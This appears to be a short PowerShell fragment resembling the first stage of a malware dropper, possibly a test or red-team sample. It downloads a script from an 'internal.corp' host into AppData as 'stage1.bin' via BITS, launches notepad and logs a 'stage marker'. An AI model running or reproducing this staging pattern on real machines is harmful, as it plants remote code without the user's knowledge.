$DownloadUrl = "http://internal.corp/updater.ps1"
$LocalPath = "$env:APPDATA\stage1.bin"
Start-BitsTransfer -Source $DownloadUrl -Destination $LocalPath
Start-Process -FilePath "notepad.exe"
Write-Verbose "stage marker 27 reached"
